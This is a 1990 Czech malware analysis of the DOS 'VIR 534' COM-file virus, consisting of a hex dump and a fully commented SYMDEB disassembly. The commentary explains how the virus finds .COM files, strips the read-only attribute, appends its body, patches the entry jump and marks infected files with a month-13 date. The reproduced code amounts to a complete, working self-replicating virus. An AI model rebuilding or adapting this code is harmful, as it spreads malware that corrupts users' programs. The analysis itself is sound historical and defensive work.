156A:1130  00 03 D7 8B DA B4 1A CD-21 BD 00 00 8B D7 81 C2  ..W.Z4.M!=...W.B
156A:1140  07 00 B9 03 00 B4 4E CD-21 E9 04 00 B4 4F CD 21  ..9..4NM!i..4OM!
156A:1150  73 15 3C 12 74 03 E9 0D-01 83 FD FF 75 03 E9 05  s.<.t.i...}.u.i.
156A:1160  01 4A BD FF FF EB DB 8B-4F 18 81 E1 E0 01 81 F9  .J=..k[.O..a`..y
156A:1170  A0 01 74 D8 81 7F 1A 00-FA 77 D1 81 7F 1A 00 01   .tX....zwQ.....
156A:1180  72 CA 57 8B F3 83 C6 1E-81 C7 14 00 83 FD FF 75  rJW.s.F..G...}.u
156A:1190  03 B0 5C AA AC AA 3C 00-75 FA 5F 8B D7 81 C2 14  .0\*,*<.uz_.W.B.
156A:11A0  00 B8 00 43 CD 21 89 8D-22 00 81 E1 FE FF 8B D7  .8.CM!.."..a~..W
156A:11B0  81 C2 14 00 B8 01 43 CD-21 8B D7 81 C2 14 00 B8  .B..8.CM!.W.B..8
156A:11C0  02 3D CD 21 73 03 E9 94-00 8B D8 B8 00 57 CD 21  .=M!s.i...X8.WM!
156A:11D0  89 8D 24 00 89 95 26 00-B4 3F B9 03 00 8B D7 81  ..$...&.4?9...W.
156A:11E0  C2 00 00 CD 21 73 03 E9-5A 00 3D 03 00 75 55 B8  B..M!s.iZ.=..uU8
156A:11F0  02 42 B9 00 00 8B D1 CD-21 2D 03 00 89 85 04 00  .B9...QM!-......
156A:1200  B9 65 01 83 FA 00 75 3C-8B D7 2B F9 83 C7 02 05  9e..z.u<.W+y.G..
156A:1210  03 01 03 C1 89 05 B4 40-8B FA 2B D1 B9 16 02 CD  ...A..4@.z+Q9..M
156A:1220  21 73 03 E9 1E 00 3D 16-02 75 19 B8 00 42 B9 00  !s.i..=..u.8.B9.
156A:1230  00 8B D1 CD 21 72 0D B4-40 B9 03 00 8B D7 81 C2  ..QM!r.4@9...W.B
156A:1240  03 00 CD 21 8B 8D 24 00-8B 95 26 00 81 E2 1F FE  ..M!..$...&..b.~
156A:1250  81 CA A0 01 B8 01 57 CD-21 B4 3E CD 21 B8 00 43  .J .8.WM!4>M!8.C
156A:1260  8B 8D 22 00 CD 21 BA 80-00 B4 1A CD 21 58 BF 00  ..".M!:..4.M!X?.
156A:1270  01 57 C3 0E 1F BA E9 0B-10 5C 3F 3F 3F 3F 3F 3F  .WC..:i..\??????
156A:1280  3F 3F 2E 43 4F 4D 00 54-2E 43 4F 4D 00 2E 43 4F  ??.COM.T.COM..CO
156A:1290  4D 00 4D 00 00 20 00 65-07 21 00 00 00 00 00 01  M.M.. .e.!......
156A:12A0  3F 3F 3F 3F 3F 3F 3F 3F-43 4F 4D 03 04 00 00 00  ????????COM.....
156A:12B0  00 00 00 00 20 65 07 21-00 0E 10 00 00 54 2E 43  .... e.!.....T.C
156A:12C0  4F 4D 00 20 20 4F 4D 00-00 00 6F 73 6F 66 74 79  OM.  OM...osofty
156A:12D0  72 69 67 68 74 20 4D 69-63 72 6F 73 6F 66 74 79  right Microsofty
156A:12E0  72 69 67 68 74 20 4D 69-63 72 6F 73 6F 66 74 79  right Microsofty
156A:12F0  72 69 67 68 74 20 4D 69-63 72 6F 73 6F 66 74 79  right Microsofty
156A:1300  72 69 67 68 74 20 4D 69-63 72 6F 73 6F 66 74 79  right Microsofty
156A:1310  72 69 67 68 74 20 4D 69-63 72 6F 73 6F 66 74 20  right Microsoft 
156A:1320  31 39 38 38


                                                              Priloha: SYMDEB/2
                                                              -----------------
;[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
;[[                               VIR  534                                   ]]
;[[     5.5.1990                                     Ing.Vladim¡r Matˆjka    ]]
;[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
;
;Natazeni infikovaneneho programu T534.COM do pameti pocitace, rozbor SYMDEB
AX=0000  BX=0000  CX=1224  DX=0000  SP=FFFE  BP=0000  SI=0000  DI=0000  
DS=156A  ES=156A  SS=156A  CS=156A  IP=0100   NV UP EI PL NZ NA PO NC 
156A:0100 E90B10         JMP	110E               ;skok na VIR_534

;------------------------------------------------------------------------------
;                         PSP - Program Segment Prefix
;Na adrese 0 v programovem segmentu je vytvoren prefix programoveho segmentu.
;------------------------------------------------------------------------------
156A:0000  CD 20 00 A0 00 9A F0 FE-1D F0 8E 09 6B 0C 2B 0A  M . ..p~.p..k.+.
156A:0010  6B 0C 56 09 6B 0C 5B 0C-01 01 01 00 02 FF FF FF  k.V.k.[.........
156A:0020  FF FF FF FF FF FF FF FF-FF FF FF FF 66 15 80 8F  ............f...
156A:0030  6B 0C 14 00 18 00 6A 15-FF FF FF FF 00 00 00 00  k.....j.........
156A:0040  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
156A:0050  CD 21 CB 00 00 00 00 00-00 00 00 00 00 20 20 20  M!K..........   
156A:0060  20 20 20 20 20 20 20 20-00 00 00 00 00 20 20 20          .....   
156A:0070  20 20 20 20 20 20 20 20-00 00 00 00 00 00 00 00          ........
;------------------------------------------------------------------------------
;                         DTA - Disk Transfer Area
;DTA je adresa zacatku pameti urcene pro diskove operace (cteni, zapis).
;------------------------------------------------------------------------------
156A:0080  00 0D 54 35 33 34-2E 43 4F 4D 00 00 00 00 00 00  . T534.COM......
156A:0090  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
156A:00A0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
156A:00B0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
156A:00C0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
156A:00D0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
156A:00E0  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
156A:00F0  00 00 00 00 00 00 00 00-00 00 00 EA F1 57 6B 0C  ...........jqWk.

;[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
;[[                                 VIR 534                                  ]]
;[[                 Zacatek infikovaneho programu T534.COM                   ]]
;[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
;VIR_534 odlozil ze zacatku programu T.COM prvni 3 byte do sveho zapisniku.
;Na toto misto zapsal adresu skoku na vlastni VIR_534, ktery pripojil na konec
;programu T.COM. Po startu infikovaneho programu T534.COM vir nejdrive provede
;opravu prvnich 3 byte programu T.COM. Po realizaci programu viru VIR_534 
;spusti vlastni, jiz neporuseny program T.COM.
;
;                   Struktura infikovaneho programu T534.COM
;
;                  |=======================================|
;               |----JMP  VIR_534 |                        |
;               |  |--------------|                        |
;               |  |                                       |
;               |  |       Puvodni dobry program T.COM     |
;               |  |                                       |
;               |  |                                       |
;               |  |=======================================|==|
;               |--->                                      |  |
;                  |               VIR_534                 |  |
;                  |                                       |+534 byte
;                  |---------------------------------------|  |
;                  |          Zapisnik VIRu_534            |  |
;                  |             DTA VIRu_534              |  |
;                  |=======================================|==|
;
;------------------------------------------------------------------------------
156A:0100 E90B10         JMP	110E               ;skok na VIR_534
;------------------------------------------------------------------------------
;         Dale puvodni dobry program T.COM bez zmen.
;------------------------------------------------------------------------------
156A:0103           0D 01 B4 09 CD-21 B4 4C CD 21 2A 2A 2A               ***
156A:0110  2A 2A 2A 2A 2A 2A 2A 2A-2A 2A 2A 2A 2A 2A 2A 2A  ****************
    :
    :
156A:1100  2A 2A 2A 2A 2A 2A 2A 2A-2A 2A 2A 2A 2A 24        *************$
;
;[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
;[[                                 VIR_534                                  ]]
;[[                    Start infitracniho programu VIR_534                   ]]
;[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]
;
156A:110E 50             PUSH	AX                 ;ulozit obsah pro vystup
;
;------------------------------------------------------------------------------
;         Obnovit puvodni program T.COM - vratit 3 byte na zacatek.
;------------------------------------------------------------------------------
;Po napadeni programu T.COM je v programu VIR_534 za instrukci MOV SI upravena
;offsetova adresa na zacatek zapisniku programu viru. Tato adresa se vypocte
;podle skutecne delky napadeneho programu (v tomto priklade T.COM).
;Oprava se provadi presunem puvodnich 3 byte [CX] ze zapisniku [DS:SI] (0E1FBA)
;na zacatek napadeneho programu CS:0100 [ES:DI], nyni je zde instrukce pro
;skok na zacatek VIRu_534 (E90B10).
156A:110F BE7312         MOV	SI,1273            ;zacatek zapisniku VIRu_534
156A:1112 8BD6           MOV	DX,SI              ;zacatek zapisniku
156A:1114 81C60000       ADD	SI,0000            ;od  [DS:SI]  156A:1273
156A:1118 FC             CLD	                   ;smer prenosu dat
156A:1119 B90300         MOV	CX,0003            ;pocet byte
156A:111C BF0001         MOV	DI,0100            ;kam [ES:DI]  156A:0100
156A:111F F3             REPZ	                   ;opakuj v delce [CX]
156A:1120 A4             MOVSB	                ;obnovit program T.COM
156A:1121 8BFA           MOV	DI,DX              ;zacatek zapisniku

;------------------------------------------------------------------------------
;         Zjistit verzi DOSu - pro nizsi verzi jak 2.0 - skok na puvodni T.COM.
;------------------------------------------------------------------------------
156A:1123 B430           MOV	AH,30              ;funkce zjisti verzi DOSu
156A:1125 CD21           INT	21                 ;sluzba DOSu 
156A:1127 3C00           CMP	AL,00              ;? verze < 2.00
156A:1129 7503           JNZ	112E               ;ne - pokracuj
156A:112B E93F01         JMP	126D               ;ano - ukoncit VIR_534

;------------------------------------------------------------------------------
;         Nastavit novou adresu DTA pro prenosy z disku.
;------------------------------------------------------------------------------
;Implicitni nastaveni adresy DTA je PSP +80H. Pro manipulacni cinnost
;VIRu_534 je tato adresa presmerovana do zapisniku viru na 156A:129F.
156A:112E BA2C00         MOV	DX,002C            ;pozice DTA v zapisniku
156A:1131 03D7           ADD	DX,DI              ;zacatek zapisniku VIRu_534
156A:1133 8BDA           MOV	BX,DX              ;[DS:DX] 156A:129F adresa DTA
156A:1135 B41A           MOV	AH,1A              ;funkce nastav adresu DTA
156A:1137 CD21           INT	21                 ;sluzba DOSu

;------------------------------------------------------------------------------
;         Vyhledat pozadovany soubor  *.COM.
;------------------------------------------------------------------------------
;V tomto bode zacina manipulacni cinnost VIRu_534.
;Program vyhleda prvni soubor odpovidajici specifikace dle smerniku ASCIIZ
;[DS:DX] (????????.COM00)  s pozadovanym atributem [CX] = 0003.
;  03 = 0000 0011
;              ||---- soubor jen na cteni RO
;              |----- skryty soubor H
;[DS:DX] ukazuje na ASCIIZ retezec ve tvaru "filename.spec00".
;Po vyhledani se napni aktualni oblast DTA +15H (popis v DTA 156A:12B4).  
156A:1139 BD0000         MOV	BP,0000            ;aktualni adresar
156A:113C 8BD7           MOV	DX,DI              ;zacatek zapisniku VIRu_534
156A:113E 81C20700       ADD	DX,0007            ;[DS:DX] 156A:127A ASCIIZ
156A:1142 B90300         MOV	CX,0003            ;atribit souboru
156A:1145 B44E           MOV	AH,4E              ;funkce najdi 1.soubor
156A:1147 CD21           INT	21                 ;sluzba DOSu
156A:1149 E90400         JMP	1150               ;vyhodnotit

;------------------------------------------------------------------------------
;         Vyhledat dalsi zodpovidajici soubor.
;------------------------------------------------------------------------------
;Tato sluzba najde nasledujici polozku adresare, ktera zodpovida specifikaci
;souboru ASCIIZ [DS:DX] z prvniho volani.
156A:114C B44F           MOV	AH,4F              ;funkce najdi dalsi soubor
156A:114E CD21           INT	21                 ;sluzba DOSu
;Pokracuje po vyhledani souboru *.COM , pokud JNB -> nasel
156A:1150 7315           JNB	1167               ;OK  nasel - pokracuj
;Rozbor chyby.
156A:1152 3C12           CMP	AL,12              ;chyba neplatny pristupovy kod
156A:1154 7403           JZ	1159               ;ano - nastav cestu
156A:1156 E90D01         JMP	1266               ;ne - vystup pri jine chybe
;Pokud neni soubor *.COM nalezen v aktualnim podadresari, je nastavena
;cesta do hlavniho adresare.
156A:1159 83FDFF         CMP	BP,FFFF            ;? hlavni adresar
156A:115C 7503           JNZ	1161               ;ne - nastavit cestu ASCIIZ
156A:115E E90501         JMP	1266               ;ano - vystup
156A:1161 4A             DEC	DX                 ;ASCIIZ "\filename.spec00"
156A:1162 BDFFFF         MOV	BP,FFFF            ;hlavni adresar
156A:1165 EBDB           JMP	1142               ;opakuj vyhledani

;------------------------------------------------------------------------------
;         Kontrola datumu a delky vyhledaneho souboru  *.COM.
;            Priznak infikovaneho programu 13.mesic !!!
;------------------------------------------------------------------------------
;Program nasel pozadovany soubor *.COM
;Kontroluje se datum vytvoreni a delka vyhledaneho programu. Pokud pozadavky
;nezodpovidaji, vyhleda se dalsi soubor v adresari. [BX] = zacatek DTA.

;Pokud je v datumu vytvoreni souboru nasteven 13.mesic !!! - priznak viru,
;vyhleda se dalsi soubor v adresari. 
156A:1167 8B4F18         MOV	CX,[BX+18]         ;datum vytvoreni souboru
156A:116A 81E1E001       AND	CX,01E0            ;maska     0000 0001 1110 0000
                                                 ;          |---r--||-m-||-d--|
156A:116E 81F9A001       CMP	CX,01A0            ;? 13.mesic - priznak viru
156A:1172 74D8           JZ	114C               ;ano - hledej dalsi soubor
;Pokud delka vyhledaneho souboru je mensi 256 byte nebo je rovna, vetsi
;64000 byte, vyhleda se dalsi soubor v adresari.
156A:1174 817F1A00FA     CMP	Word Ptr [BX+1A],FA00 ;? delka souboru > 64000
156A:1179 77D1           JA	114C               ;ano - hledej dalsi soubor
156A:117B 817F1A0001     CMP	Word Ptr [BX+1A],0100 ;? delka souboru < 256 
156A:1180 72CA           JB	114C               ;ano - hledej dalsi soubor

;------------------------------------------------------------------------------
;Presun specifikace a parametru vyhledaneho souboru z DTA do zap. VIRu_534.
;------------------------------------------------------------------------------
;Vyhledan soubor *.COM, splnuje podminky delky programu a neobsahuje
;priznak viru - 13.mesic, splnuje pozadavek na atributy.
156A:1182 57             PUSH	DI                 ;zacatek zapisniku 156A:1273
156A:1183 8BF3           MOV	SI,BX              ;zacatek DTA       156A:129F
156A:1185 83C61E         ADD	SI,+1E             ;zac.nazvu souboru T.COM v DTA
156A:1188 81C71400       ADD	DI,0014            ;zacatek ASCIIZ v zapisniku
156A:118C 83FDFF         CMP	BP,FFFF            ;? hlavni adresar
156A:118F 7503           JNZ	1194               ;ne
;Nastavit specifikaci ASCIIZ v zapisniku ve tvaru "\filename.spec00".
156A:1191 B05C           MOV	AL,5C              ;'\' 
156A:1193 AA             STOSB	                ;ulozit '\' do ASCIIZ
;Nastavit specifikaci ASCIIZ v zapisniku ve tvaru "filename.spec00".
156A:1194 AC             LODSB	                ;nacist byte [DS:SI] z DTA
156A:1195 AA             STOSB	                ;ulozit byte [ES:DI] do zapis.
156A:1196 3C00           CMP	AL,00              ;? konec ASCIIZ
156A:1198 75FA           JNZ	1194               ;ne - presun cely nazev soub.
156A:119A 5F             POP	DI                 ;zacatek zapisniku

;------------------------------------------------------------------------------
;         Zjistit atributy souboru - zrusit atribut RO.
;------------------------------------------------------------------------------
;Zjistit atributy souboru [CX], [DS:DX] smernik na ASCIIZ ( \filename.spec00 ).
;Atributy odlozit, pozor - po rozsireni VIRu_534 nebudou souboru vraceny!!
156A:119B 8BD7           MOV	DX,DI              ;zacatek zapisniku 156A:1273
156A:119D 81C21400       ADD	DX,0014            ;[DS:DX] smernik na ASCIIZ
156A:11A1 B80043         MOV	AX,4300            ;funkce zjisti atributy 
156A:11A4 CD21           INT	21                 ;sluzba DOSu
156A:11A6 898D2200       MOV	[DI+0022],CX       ;ulozit atributy souboru
;Zrusit [CX] atribut RO souboru, [DS:DX] smernik na ASCIIZ ( \filename.spec00 )
156A:11AA 81E1FEFF       AND	CX,FFFE            ;zrusit akt. atribut RO
156A:11AE 8BD7           MOV	DX,DI              ;zacatek zapisniku
156A:11B0 81C21400       ADD	DX,0014            ;[DS:DX] smernik na ASCIIZ
156A:11B4 B80143         MOV	AX,4301            ;funkce nastav atributy
156A:11B7 CD21           INT	21                 ;sluzba DOSu

;------------------------------------------------------------------------------
;         Otevrit soubor pro cteni a zapis.
;------------------------------------------------------------------------------
;Otevrit soubor pro cteni a zapis. Pokud soubor nelze v tomto rezimu
;otevrit, zustane zrusen atribut RO a vystup pres opaveny T.COM.
156A:11B9 8BD7           MOV	DX,DI              ;zacatek zapisniku 156A:1273
156A:11BB 81C21400       ADD	DX,0014            ;[DS:DX] smernik na ASCIIZ
156A:11BF B8023D         MOV	AX,3D02            ;funkce otevri soub. pro R/W
156A:11C2 CD21           INT	21                 ;sluzba DOSu
156A:11C4 7303           JNB	11C9               ;? ok - [AX] manip. souboru
156A:11C6 E99400         JMP	125D               ;error - vystup

;------------------------------------------------------------------------------
;         Zjistit cas a datum vytvoreni souboru.
;------------------------------------------------------------------------------
;Cas a datum vytvoreni souboru odlozit do zapisniku. Po infikaci souboru
;bude cas souboru vracen a v datumu bude nastaven priznak viru.
156A:11C9 8BD8           MOV	BX,AX              ;[BX] manipulator souboru
156A:11CB B80057         MOV	AX,5700            ;funkce vrat cas a datum
156A:11CE CD21           INT	21                 ;sluzba DOSu
156A:11D0 898D2400       MOV	[DI+0024],CX       ;odlozit cas souboru
156A:11D4 89952600       MOV	[DI+0026],DX       ;odlozit datum souboru 

;------------------------------------------------------------------------------
;         Nacist ze zacatku souboru prvni 3 byte.
;------------------------------------------------------------------------------
;Z otevreneho souboru [BX] - manipulator souboru, nacist prvni 3 byte [CX],
;tyto ulozit do bufferu [DS:DX] - pro obnovu infikovaneho programu.
;Pri chybe vystup pres opraveny program T.COM. V infikovanem souboru nastaven
;priznak VIRu_534 - 13.mesic, zrusen atribut RO.
156A:11D8 B43F           MOV	AH,3F              ;funkce cti ze souboru
156A:11DA B90300         MOV	CX,0003            ;pocet byte
156A:11DD 8BD7           MOV	DX,DI              ;[DS:DX] buffer 156A:1273
156A:11DF 81C20000       ADD	DX,0000            ;buffer - zac. zapisniku
156A:11E3 CD21           INT	21                 ;sluzba DOSu
156A:11E5 7303           JNB	11EA               ;? ok - pokracuj
156A:11E7 E95A00         JMP	1244               ;error - vystup
156A:11EA 3D0300         CMP	AX,0003            ;? nactene 3 byte
156A:11ED 7555           JNZ	1244               ;ne - error vystup

;------------------------------------------------------------------------------
;         Nastavit smernik na konec souboru, vypocet delky skoku.
;------------------------------------------------------------------------------
;Nastavit smernik na konec souboru. Pri vystupu [DX:AX] nova poloha smerniku.
156A:11EF B80242         MOV	AX,4202            ;funkce posun smernik
156A:11F2 B90000         MOV	CX,0000            ;[CX:DX] byte od konce souboru
156A:11F5 8BD1           MOV	DX,CX 
156A:11F7 CD21           INT	21                 ;sluzba DOSu
;Vypocet offset adresy skoku na vir.
;V tomto nasem pripade [AX] = 100E - delka programu T.COM.
;Adresa skoku se vypocita z delky programu T.COM - 3 byte (JMP offset VIR_534).
156A:11F9 2D0300         SUB	AX,0003            ;offset adresy skoku 100B
156A:11FC 89850400       MOV	[DI+0004],AX       ;ulozit do zapisniku JMP [AX]

;------------------------------------------------------------------------------
;         Zapis VIRu_534 na konec souboru.
;------------------------------------------------------------------------------
;Pri chybe vystup pres opraveny program T.COM. V infikovanem souboru pripojen
;mrtvy VIR_534, nastaven priznak VIRu_534 - 13.mesic, zrusen atribut RO.
;
;Nastavit offset adresu zapisniku VIRu_534 dle skutecne delky infikovaneho
;programu do instrukce MOV SI,offset adresa zapisniku (zacatek).
156A:1200 B96501         MOV	CX,0165            ;delka tela viru - po zapisnik
156A:1203 83FA00         CMP	DX,+00             ;? nastaven smernik na konec
156A:1206 753C           JNZ	1244               ;ne - vystup
;Vypocet pozice offset adresy zapisniku [DI] v instrukci MOV SI,offset adresa.
156A:1208 8BD7           MOV	DX,DI              ;zacatek zapisniku 156A:1273
156A:120A 2BF9           SUB	DI,CX              ;- delka tela VIRu_534 CS:110E
156A:120C 83C702         ADD	DI,+02             ;156A:1110 - pozice MOV SI,...
;                                                                  [DI]---->|
;Vypocet offset adresy zacatku zapisniku dle skutecne delky infik. programu.
;Delka   (T.COM - 3)  + PSP  + 3 (JMP vir_534)  + telo VIRu_534
;           100B      + 100  + 3                +      165      = 1273H
156A:120F 050301         ADD	AX,0103            ;100B+103= 110E - zac.VIRu_534
156A:1212 03C1           ADD	AX,CX              ;110E+165= 1273   + telo
156A:1214 8905           MOV	[DI],AX            ;offset adresa zap.MOV SI,[AX]
;Zapis VIRu_534 na konec souboru.
156A:1216 B440           MOV	AH,40              ;funkce zapis do souboru
156A:1218 8BFA           MOV	DI,DX              ;zacatek zapisniku - odlozit
156A:121A 2BD1           SUB	DX,CX              ;[DS:DX] buffer - zac.VIRu_534
156A:121C B91602         MOV	CX,0216            ;delka celeho VIRu_534
156A:121F CD21           INT	21                 ;sluzba DOSu
156A:1221 7303           JNB	1226               ;? ok - pokracuj
156A:1223 E91E00         JMP	1244               ;error - vystup
156A:1226 3D1602         CMP	AX,0216            ;? zapsany cely vir
156A:1229 7519           JNZ	1244               ;ne - error vystup

;------------------------------------------------------------------------------
;         Nastavit smernik na zacatek souboru.
;------------------------------------------------------------------------------
156A:122B B80042         MOV	AX,4200            ;funkce nastav smernik
156A:122E B90000         MOV	CX,0000            ;[CX:DX] byte od zac.souboru
156A:1231 8BD1           MOV	DX,CX 
156A:1233 CD21           INT	21                 ;sluzba DOSu
156A:1235 720D           JB	1244               ;? error - vystup

;------------------------------------------------------------------------------
;         Zapis skoku na VIR_534 na zacatek souboru.
;------------------------------------------------------------------------------
156A:1237 B440           MOV	AH,40              ;funkce zapis do souboru
156A:1239 B90300         MOV	CX,0003            ;pocet byte
156A:123C 8BD7           MOV	DX,DI              ;zacatek zapisniku 156A:1273
156A:123E 81C20300       ADD	DX,0003            ;buffer- JMP offset.adrs skoku
156A:1242 CD21           INT	21                 ;sluzba DOSu

;------------------------------------------------------------------------------
;         Vratit puvodni cas vytvoreni souboru.
;         Nastavit priznak viru - 13.mesic !!!!
;------------------------------------------------------------------------------
;Ze zapisniku VIRu_534 jsou vybrany puvodni hodnoty casu a datumu vytvoreni
;souboru, ktery byl infikovan. Cas je vracen v puvodni hodnote. Hodnota
;datumu je zmenena na 13.mesic, den a rok zustavaji bez zmeny.
156A:1244 8B8D2400       MOV	CX,[DI+0024]       ;puvodni cas souboru
156A:1248 8B952600       MOV	DX,[DI+0026]       ;puvodni datum souboru
156A:124C 81E21FFE       AND	DX,FE1F            ;mesic 1111 1110 0001 1111
                                                 ;      |---r--||-m-||-d--| 
156A:1250 81CAA001       OR	DX,01A0            ;13 !  0000 0001 1010 0000
156A:1254 B80157         MOV	AX,5701            ;funkce vrat cas a datum
156A:1257 CD21           INT	21                 ;sluzba DOSu

;------------------------------------------------------------------------------
;         Uzavrit soubor.
;------------------------------------------------------------------------------
156A:1259 B43E           MOV	AH,3E              ;funkce uzavrit soubor
156A:125B CD21           INT	21                 ;sluzba DOSu

;------------------------------------------------------------------------------
;         Atributy souboru.
;------------------------------------------------------------------------------
;Tato cast programu nema smysl. Pokud by program obsahoval instrukci
;MOV AX,4301 -> budou vraceny puvodni atributy souboru.
156A:125D B80043         MOV	AX,4300            ;funkce zjisti atributy
156A:1260 8B8D2200       MOV	CX,[DI+0022]       ;vybrat puvodni atributy
156A:1264 CD21           INT	21                 ;sluzba DOSu

;------------------------------------------------------------------------------
;         Nastavit adresu DTA pro prenosy z disku.
;------------------------------------------------------------------------------
;Vratit implicitni nastaveni DTA  - offset 80H v PSP
156A:1266 BA8000         MOV	DX,0080            ;DS:DX  adresa DTA
156A:1269 B41A           MOV	AH,1A              ;sluzba nastav DTA
156A:126B CD21           INT	21                 ;funkce DOSu

;------------------------------------------------------------------------------
;         Ukoncit cinnost VIRu_534 - start puvodniho programu T.COM
;------------------------------------------------------------------------------
;Vystup z programu VIRu_534 - start puvodniho obnoveneho programu T.COM.
;Na vrchol STACKu je odlozena navratova adresa z RET VIRu_534 (0100).
;Po vykonani instrukce RET program pokracuje od adresy CS:0100 - start
;obnoveneho programu T.COM.
156A:126D 58             POP	AX                 ;obnovit obsah
156A:126E BF0001         MOV	DI,0100            ;adresa zacatku T.COM
156A:1271 57             PUSH	DI                 ;odlozit do STACKu 
156A:1272 C3             RET	                   ;pokracovat v prog. T.COM

;------------------------------------------------------------------------------
;         Struktura zapisniku VIRu_534.
;------------------------------------------------------------------------------
156A:1273 0E1FBA         ;+0  puvodni 3 byte T.COM
156A:1276 E90B10         ;+3  JMP offset adresa - skok na vir dle delky
                         ;    infikovaneho programu T.COM
;Specifikace a parametry souboru na ktery se pripoji VIR_534
156A:1279 \????????.COM00;+6  specifikace souboru ASCIIZ pro hl.adresar
156A:127A ????????.COM00 ;+7  specifikace souboru ASCIIZ pro akt.adresar
156A:1287 T.COM00        ;+14 nazev vyhledaneho souboru ASCIIZ (\T.COM)
156A:1295 2000           ;+22 atribut vyhledaneho souboru - zrusen RO
156A:1297 6507           ;+24 cas vyhledaneho souboru
156A:1299 2100           ;+26 datum vyhledaneho souboru
156A:129B 0000  
156A:129D 0000  

;------------------------------------------------------------------------------
;         DTA pro program VIRu_534.
;------------------------------------------------------------------------------
;15H byte pro dalsi cteni souboru
156A:129F 01 
156A:12A1 ????????COM
156A:12AB 0304  
156A:12AD 0000  
156A:12AF 0000  
156A:12B1 0000  
156A:12B3 00
;Oblast [DTA + 15H] - parametry nacteneho souboru
156A:12B4 20              ;+15 atributy souboru
156A:12B5 6507            ;+16 cas vytvoreni souboru
156A:12B7 2100            ;+18 datum vytvoreni souboru
156A:12B9 0E10            ;+1A velikost souboru - nizsi cast
156A:12BB 0000            ;+1C velikost souboru - vyssi cast
156A:12BD T.COM00         ;+1E nazev souboru.typ (mezery vypusteny)

156A:12C8  ..osoftyright Microsoftyright Microsoftyright Microsofty
156A:1300  right Microsoftyright Microsoft
156A:1320  1988
